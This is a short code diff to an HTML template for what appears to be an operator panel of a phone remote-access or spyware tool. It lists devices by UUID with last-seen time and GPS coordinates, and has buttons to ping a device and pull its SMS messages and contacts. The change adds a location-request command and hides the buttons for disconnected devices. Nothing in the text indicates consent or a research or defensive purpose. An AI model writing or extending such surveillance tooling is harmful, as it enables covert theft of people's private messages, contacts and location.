@@ -31,9 +31,12 @@
         <td>{{.LastSeen}}</td>
         <td>lat: {{.Location.Lat}} <br> lon: {{.Location.Lon}}</td>
         <td>
-            <button onclick="sendCommand('ping', '{{.UUID}}')">Send Ping</button>
-            <button onclick="sendCommand('sms', '{{.UUID}}')">Request SMS</button>
-            <button onclick="sendCommand('contacts', '{{.UUID}}')">Request Contacts</button>
+            {{if .Connected}}
+                <button onclick="sendCommand('ping', '{{.UUID}}')">Send Ping</button>
+                <button onclick="sendCommand('location', '{{.UUID}}')">Request Location</button>
+                <button onclick="sendCommand('sms', '{{.UUID}}')">Request SMS</button>
+                <button onclick="sendCommand('contacts', '{{.UUID}}')">Request Contacts</button>
+            {{end}}
         </td>
     </tr>
     {{end}}
